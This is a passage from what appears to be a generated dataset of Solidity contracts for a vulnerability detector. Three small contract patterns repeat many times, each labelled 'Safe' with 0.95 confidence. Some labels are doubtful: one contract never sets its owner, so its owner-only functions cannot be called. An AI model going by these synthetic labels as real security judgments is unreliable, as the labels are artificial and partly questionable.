    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 302",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 303",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 304",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 305",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 306",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 307",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 308",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 309",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 310",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 311",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 312",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 313",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 314",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 315",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 316",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 317",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 318",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 319",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 320",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 321",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 322",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 323",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 324",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 325",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 326",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 327",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 328",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 329",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 330",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 331",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
